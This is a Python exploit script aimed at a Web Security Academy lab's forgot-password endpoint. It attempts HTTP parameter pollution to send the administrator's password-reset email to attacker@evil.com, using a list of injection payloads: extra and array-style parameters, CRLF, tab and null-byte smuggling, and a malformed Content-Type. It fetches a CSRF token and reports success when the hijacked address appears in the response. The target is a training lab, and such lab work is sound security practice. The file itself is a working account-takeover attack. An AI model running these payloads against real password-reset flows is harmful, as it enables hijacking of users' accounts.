#!/usr/bin/env python3
import requests
import sys
import json
import re

def get_csrf_token(session, lab_url):
    """Get CSRF token from forgot-password page"""
    resp = session.get(f"{lab_url}/forgot-password")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', resp.text)
    if csrf_match:
        return csrf_match.group(1)
    return None

def exploit_forgot_password(lab_url):
    """Mimic the JS forgot-password request with parameter pollution"""

    session = requests.Session()

    # Get session
    print("[*] Getting session...")
    session.get(f"{lab_url}/login")
    print(f"Session: {session.cookies.get('session')}")

    # Get CSRF token
    csrf = get_csrf_token(session, lab_url)
    print(f"CSRF: {csrf}")

    reset_url = f"{lab_url}/forgot-password"

    # Headers that match what the JS would send
    headers = {
        "Content-Type": "x-www-form-urlencoded",  # Malformed like in the JS!
        "Accept": "*/*",
        "Origin": lab_url,
        "Referer": f"{lab_url}/forgot-password",
        "X-Requested-With": "XMLHttpRequest"  # Typical for fetch requests
    }

    print("\n[*] Testing parameter pollution with JS-style request...")

    # Since the JS has the bug, maybe the server expects this and processes it differently
    # The server might be:
    # 1. Parsing it as plain text and splitting on & manually
    # 2. Treating it as a different format due to missing "application/"
    # 3. Having a vulnerability in how it handles malformed Content-Type

    payloads = [
        # Normal request first
        f"csrf={csrf}&username=administrator",

        # Try injecting into the username value
        f"csrf={csrf}&username=administrator&field=result&value=attacker@evil.com",

        # Try overriding the response
        f"csrf={csrf}&username=administrator&result=attacker@evil.com",

        # Try array-style parameters
        f"csrf={csrf}&username=administrator&username[email]=attacker@evil.com",

        # Try without proper URL encoding (since Content-Type is malformed)
        f"csrf={csrf}&username=administrator&email=attacker@evil.com",

        # Try injecting via the username field itself
        f'csrf={csrf}&username=administrator"&email="attacker@evil.com',

        # Backend might be using a different parser
        f"csrf={csrf}&username=administrator\n&email=attacker@evil.com",
        f"csrf={csrf}&username=administrator\r\n&email=attacker@evil.com",

        # Tab character
        f"csrf={csrf}&username=administrator\t&email=attacker@evil.com",

        # Null byte
        f"csrf={csrf}&username=administrator\x00&email=attacker@evil.com",
    ]

    for i, payload in enumerate(payloads, 1):
        print(f"\n[Test {i}]")
        print(f"Payload: {repr(payload[:80])}...")

        try:
            response = session.post(
                reset_url,
                data=payload,
                headers=headers,
                allow_redirects=False
            )

            print(f"Status: {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()
                    print(f"Response: {result}")

                    if "result" in result:
                        email = result["result"]
                        if "attacker" in email or "evil" in email:
                            print(f"\n[!!!] SUCCESS! Email hijacked to: {email}")
                            print(f"[!!!] Working payload: {repr(payload)}")
                            return True
                        elif "*****" not in email:
                            print(f"[!] Email changed/revealed: {email}")

                except json.JSONDecodeError:
                    print(f"Non-JSON response: {response.text[:100]}")

            elif response.status_code == 500:
                print("[!] Server error - might be processing the request differently")

        except Exception as e:
            print(f"Error: {e}")

    return False

if __name__ == "__main__":
    lab_url = "https://0aa1009a0379161a82cd10b40031005f.web-security-academy.net"

    if len(sys.argv) > 1:
        lab_url = sys.argv[1].rstrip('/')

    print(f"Exploiting: {lab_url}")
    exploit_forgot_password(lab_url)